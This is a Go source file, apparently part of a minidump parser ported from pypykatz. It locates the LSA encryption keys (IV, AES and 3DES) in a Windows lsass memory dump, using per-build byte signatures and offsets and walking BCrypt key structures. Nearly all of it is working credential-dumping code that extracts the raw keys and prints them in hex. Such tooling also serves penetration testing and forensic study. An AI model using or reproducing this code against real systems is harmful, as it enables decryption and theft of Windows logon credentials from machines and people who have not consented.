package minidump

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
)

// LSA key template patterns for different Windows versions
// Ported from pypykatz lsa_template_nt6.py

// LSAKeyPattern defines the pattern for finding LSA encryption keys
type LSAKeyPattern struct {
	Signature      []byte
	IVLength       int
	OffsetToIVPtr  int
	OffsetToDESPtr int
	OffsetToAESPtr int
}

// GetLSAPattern returns the appropriate pattern for the given Windows build
func GetLSAPattern(buildNumber uint32) *LSAKeyPattern {
	// Windows 11 24H2+ (build 26100+) - LSA_x64_9
	if buildNumber >= 26100 {
		return &LSAKeyPattern{
			Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15},
			IVLength:       16,
			OffsetToIVPtr:  71,
			OffsetToDESPtr: -89,
			OffsetToAESPtr: 16,
		}
	}

	// Windows 11 (build 22000-26099) - LSA_x64_8
	if buildNumber >= 22000 && buildNumber < 26100 {
		return &LSAKeyPattern{
			Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15},
			IVLength:       16,
			OffsetToIVPtr:  58,
			OffsetToDESPtr: -89,
			OffsetToAESPtr: 16,
		}
	}

	// Windows 10 1809+ through Win10 (before Win11)
	// Build range: 17763 - 21999
	if buildNumber >= 17763 && buildNumber < 22000 {
		return &LSAKeyPattern{
			Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15},
			IVLength:       16,
			OffsetToIVPtr:  67,
			OffsetToDESPtr: -89,
			OffsetToAESPtr: 16,
		}
	}

	// Windows 10 1507-1803
	if buildNumber >= 10240 && buildNumber < 17763 {
		return &LSAKeyPattern{
			Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15},
			IVLength:       16,
			OffsetToIVPtr:  61,
			OffsetToDESPtr: -73,
			OffsetToAESPtr: 16,
		}
	}

	// Windows 8.1
	if buildNumber >= 9600 && buildNumber < 10240 {
		return &LSAKeyPattern{
			Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d},
			IVLength:       16,
			OffsetToIVPtr:  62,
			OffsetToDESPtr: -70,
			OffsetToAESPtr: 23,
		}
	}

	// Windows 8
	if buildNumber >= 9200 && buildNumber < 9600 {
		return &LSAKeyPattern{
			Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d},
			IVLength:       16,
			OffsetToIVPtr:  62,
			OffsetToDESPtr: -70,
			OffsetToAESPtr: 23,
		}
	}

	// Windows 7
	if buildNumber >= 7600 && buildNumber < 9200 {
		return &LSAKeyPattern{
			Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d},
			IVLength:       16,
			OffsetToIVPtr:  59,
			OffsetToDESPtr: -61,
			OffsetToAESPtr: 25,
		}
	}

	// Default to Windows 10 1809+ pattern
	return &LSAKeyPattern{
		Signature:      []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15},
		IVLength:       16,
		OffsetToIVPtr:  67,
		OffsetToDESPtr: -89,
		OffsetToAESPtr: 16,
	}
}

// LSAKeys holds the encryption keys
type LSAKeys struct {
	IV     []byte
	AESKey []byte
	DESKey []byte
}

// FindLSAKeys searches for LSA encryption keys in the dump
func (d *Dump) FindLSAKeys() (*LSAKeys, error) {
	if d.SystemInfo == nil {
		return nil, fmt.Errorf("no system info available")
	}

	if len(d.Memory) == 0 {
		return nil, fmt.Errorf("no memory data available")
	}

	pattern := GetLSAPattern(d.SystemInfo.BuildNumber)

	// Search for the signature in memory
	sigOffset := bytes.Index(d.Memory, pattern.Signature)
	if sigOffset < 0 {
		return nil, fmt.Errorf("LSA signature not found in memory")
	}

	keys := &LSAKeys{}

	// Read IV using RIP-relative addressing
	// The offset points to a 32-bit relative offset that we need to resolve
	ivAddr := getPtrWithOffset(d.Memory, sigOffset, pattern.OffsetToIVPtr)
	if ivAddr > 0 && int(ivAddr)+pattern.IVLength <= len(d.Memory) {
		keys.IV = make([]byte, pattern.IVLength)
		copy(keys.IV, d.Memory[ivAddr:int(ivAddr)+pattern.IVLength])
	}

	// Read AES key handle pointer
	// getPtrWithOffset gives us a file offset, but at that location is a VA pointer to the handle
	aesHandleOffset := getPtrWithOffset(d.Memory, sigOffset, pattern.OffsetToAESPtr)
	if aesHandleOffset > 0 {
		keys.AESKey = d.extractKeyFromHandlePtr(aesHandleOffset)
	}

	// Read DES key handle pointer
	desHandleOffset := getPtrWithOffset(d.Memory, sigOffset, pattern.OffsetToDESPtr)
	if desHandleOffset > 0 {
		keys.DESKey = d.extractKeyFromHandlePtr(desHandleOffset)
	}

	return keys, nil
}

// extractKeyFromHandlePtr follows the pointer chain using VA translation
func (d *Dump) extractKeyFromHandlePtr(ptrOffset int64) []byte {
	if ptrOffset < 0 || int(ptrOffset)+8 > len(d.Memory) {
		return nil
	}

	// Read the VA pointer at this offset
	handleVA := binary.LittleEndian.Uint64(d.Memory[ptrOffset:])

	// Translate VA to file offset
	handleOffset := d.VAToOffset(handleVA)
	if handleOffset < 0 {
		return nil
	}

	// Read data at the handle offset
	handleData := d.Memory[handleOffset:]
	if len(handleData) < 32 {
		return nil
	}

	// Check for KIWI_BCRYPT_HANDLE_KEY tag "RUUU" at offset 4
	tag := handleData[4:8]
	if bytes.Equal(tag, []byte("RUUU")) {
		// This is a handle structure, read ptr_key (VA at offset 16)
		keyVA := binary.LittleEndian.Uint64(handleData[16:])
		keyOffset := d.VAToOffset(keyVA)
		if keyOffset >= 0 {
			return d.extractKeyFromBCryptKeyOffset(keyOffset)
		}
	}

	// Maybe it's already pointing to the key structure
	return d.extractKeyFromBCryptKeyOffset(handleOffset)
}

// extractKeyFromBCryptKeyOffset extracts the key from a BCRYPT_KEY structure at a file offset
func (d *Dump) extractKeyFromBCryptKeyOffset(offset int64) []byte {
	if offset < 0 || int(offset)+64 > len(d.Memory) {
		return nil
	}

	keyData := d.Memory[offset:]
	if len(keyData) < 64 {
		return nil
	}

	// Check for KIWI_BCRYPT_KEY tag "KSSM" or "MSSK" at offset 4
	tag := keyData[4:8]
	if !bytes.Equal(tag, []byte("KSSM")) && !bytes.Equal(tag, []byte("MSSK")) {
		return nil
	}

	// Try to find the hard key at various offsets
	// The KIWI_HARD_KEY structure is: cbSecret (ULONG) + data (cbSecret bytes)
	hardKeyOffsets := []int{
		0x48, // KIWI_BCRYPT_KEY81 on x64
		0x50, // Alternative
		0x58, // KIWI_BCRYPT_KEY81_NEW
		0x38, // KIWI_BCRYPT_KEY8
		0x28, // KIWI_BCRYPT_KEY
	}

	for _, off := range hardKeyOffsets {
		if off+4 > len(keyData) {
			continue
		}

		// Read cbSecret (key length)
		keyLen := binary.LittleEndian.Uint32(keyData[off:])

		// Valid key sizes for LSA: 16 (AES-128), 24 (3DES), 32 (AES-256)
		if keyLen != 16 && keyLen != 24 && keyLen != 32 {
			continue
		}

		if off+4+int(keyLen) > len(keyData) {
			continue
		}

		key := make([]byte, keyLen)
		copy(key, keyData[off+4:off+4+int(keyLen)])

		// Verify key is not all zeros or all same byte
		if isValidKeyData(key) {
			return key
		}
	}

	return nil
}

// getPtrWithOffset reads a RIP-relative pointer and resolves it
// This mimics pypykatz's reader.get_ptr_with_offset()
func getPtrWithOffset(mem []byte, baseOffset int, relOffset int) int64 {
	ptrLocation := baseOffset + relOffset
	if ptrLocation < 0 || ptrLocation+4 > len(mem) {
		return -1
	}

	// Read the 32-bit relative offset
	rel32 := int32(binary.LittleEndian.Uint32(mem[ptrLocation:]))

	// Calculate absolute address: location + 4 (size of offset) + relative offset
	// This is standard RIP-relative addressing used in x64
	absAddr := int64(ptrLocation) + 4 + int64(rel32)

	if absAddr < 0 || absAddr >= int64(len(mem)) {
		return -1
	}

	return absAddr
}

// extractKeyFromHandle follows the BCRYPT handle chain to extract the actual key
// Mimics pypykatz's key extraction from KIWI_BCRYPT_HANDLE_KEY -> KIWI_BCRYPT_KEY -> KIWI_HARD_KEY
func extractKeyFromHandle(mem []byte, handlePtrAddr int64) []byte {
	if handlePtrAddr < 0 || int(handlePtrAddr)+8 > len(mem) {
		return nil
	}

	// First, read the pointer to the key handle
	handlePtr := binary.LittleEndian.Uint64(mem[handlePtrAddr:])

	// Convert to offset in our memory buffer
	// Note: handlePtr is a virtual address, we need to find it in our memory
	// For minidumps, we work with file offsets not virtual addresses
	// So handlePtrAddr should already point to the handle structure

	// Check for KIWI_BCRYPT_HANDLE_KEY at handlePtrAddr (if it's already the struct)
	if int(handlePtrAddr)+32 <= len(mem) {
		// KIWI_BCRYPT_HANDLE_KEY structure:
		// size: ULONG (4 bytes)
		// tag: 4 bytes - should be "RUUU"
		// hAlgorithm: PVOID (8 bytes)
		// ptr_key: PVOID (8 bytes) - pointer to KIWI_BCRYPT_KEY
		tag := mem[handlePtrAddr+4 : handlePtrAddr+8]
		if bytes.Equal(tag, []byte("RUUU")) {
			// This is a handle, read ptr_key
			keyPtr := binary.LittleEndian.Uint64(mem[handlePtrAddr+16:])
			return extractKeyFromBCryptKey(mem, keyPtr)
		}
	}

	// Maybe handlePtr is the actual location
	if handlePtr > 0 && int64(handlePtr) < int64(len(mem)) && int64(handlePtr)+32 <= int64(len(mem)) {
		tag := mem[handlePtr+4 : handlePtr+8]
		if bytes.Equal(tag, []byte("RUUU")) {
			keyPtr := binary.LittleEndian.Uint64(mem[handlePtr+16:])
			return extractKeyFromBCryptKey(mem, keyPtr)
		}
	}

	// Try direct key extraction at handlePtrAddr
	return extractKeyFromBCryptKey(mem, uint64(handlePtrAddr))
}

// extractKeyFromBCryptKey extracts the key data from a KIWI_BCRYPT_KEY structure
func extractKeyFromBCryptKey(mem []byte, keyAddr uint64) []byte {
	if keyAddr == 0 || int64(keyAddr)+64 > int64(len(mem)) {
		return nil
	}

	// KIWI_BCRYPT_KEY81 structure (Windows 8.1+):
	// size: ULONG (4)
	// tag: 4 bytes - "KSSM" or "MSSK"
	// type: ULONG (4)
	// unk0-unk4: various fields
	// hardkey at offset varies by version

	tag := mem[keyAddr+4 : keyAddr+8]
	if !bytes.Equal(tag, []byte("KSSM")) && !bytes.Equal(tag, []byte("MSSK")) {
		// Try swapped tag check
		if !bytes.Equal(tag, []byte("MSSM")) {
			return nil
		}
	}

	// Try to find the hard key at various offsets
	// The KIWI_HARD_KEY structure is: cbSecret (ULONG) + data (cbSecret bytes)
	hardKeyOffsets := []uint64{
		0x48, // KIWI_BCRYPT_KEY81 on x64
		0x50, // Alternative
		0x38, // KIWI_BCRYPT_KEY8
		0x28, // KIWI_BCRYPT_KEY
		0x58, // KIWI_BCRYPT_KEY81_NEW
	}

	for _, off := range hardKeyOffsets {
		if int64(keyAddr+off)+4 > int64(len(mem)) {
			continue
		}

		// Read cbSecret (key length)
		keyLen := binary.LittleEndian.Uint32(mem[keyAddr+off:])

		// Valid key sizes for LSA: 16 (AES-128), 24 (3DES), 32 (AES-256)
		if keyLen != 16 && keyLen != 24 && keyLen != 32 {
			continue
		}

		if int64(keyAddr+off)+4+int64(keyLen) > int64(len(mem)) {
			continue
		}

		key := make([]byte, keyLen)
		copy(key, mem[keyAddr+off+4:keyAddr+off+4+uint64(keyLen)])

		// Verify key is not all zeros or all same byte
		if !isValidKeyData(key) {
			continue
		}

		return key
	}

	return nil
}

// isValidKeyData checks if the key data looks valid
func isValidKeyData(key []byte) bool {
	if len(key) == 0 {
		return false
	}

	allZero := true
	allSame := true
	firstByte := key[0]

	for _, b := range key {
		if b != 0 {
			allZero = false
		}
		if b != firstByte {
			allSame = false
		}
	}

	return !allZero && !allSame
}

// String returns a formatted representation of the keys
func (k *LSAKeys) String() string {
	if k == nil {
		return "LSAKeys: nil"
	}

	result := "LSA Keys:\n"
	result += fmt.Sprintf("  IV (%d bytes): %s\n", len(k.IV), hex.EncodeToString(k.IV))

	if k.AESKey != nil {
		result += fmt.Sprintf("  AES Key (%d bytes): %s\n", len(k.AESKey), hex.EncodeToString(k.AESKey))
	} else {
		result += "  AES Key: not found\n"
	}

	if k.DESKey != nil {
		result += fmt.Sprintf("  DES Key (%d bytes): %s\n", len(k.DESKey), hex.EncodeToString(k.DESKey))
	} else {
		result += "  DES Key: not found\n"
	}

	return result
}
